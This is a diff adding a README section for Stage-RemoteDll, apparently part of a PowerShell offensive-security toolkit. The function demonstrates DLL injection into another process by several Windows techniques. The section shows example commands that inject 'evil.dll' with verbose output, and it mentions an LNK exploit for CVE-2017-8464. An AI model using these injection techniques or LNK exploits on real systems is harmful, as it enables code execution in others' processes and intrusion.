@@ -282,6 +282,33 @@ False
 
 ## pwnd
 
+### Stage-RemoteDll
+
+Stage-RemoteDll is a small function to demonstrate various Dll injection techniques (NtCreateThreadEx / QueueUserAPC / SetThreadContext / SetWindowsHookEx) on 32 and 64 bit architectures. While I have done some input validation & cleanup, this is mostly POC code. Note also that these techniques can easily be repurposed to directly execute shellcode in the remote process.
+
+```
+# Boolean return value
+C:\PS> $CallResult = Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode NtCreateThreadEx
+C:\PS> $CallResult
+True
+
+# Verbose output
+C:\PS> Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode QueueUserAPC -Verbose
+VERBOSE: [+] Using QueueUserAPC
+VERBOSE: [>] Opening notepad
+VERBOSE: [>] Allocating DLL path memory
+VERBOSE: [>] Writing DLL string
+VERBOSE: [>] Locating LoadLibraryA
+VERBOSE: [>] Getting process threads
+VERBOSE: [>] Registering APC's with all threads
+VERBOSE:   --> Success, registered APC
+VERBOSE:   --> Success, registered APC
+VERBOSE:   --> Success, registered APC
+VERBOSE:   --> Success, registered APC
+VERBOSE: [>] Cleaning up..
+True
+```
+
 ### Export-LNKPwn
 
 Create LNK files to exploit CVE-2017-8464 aka LNK round 3 ;))!
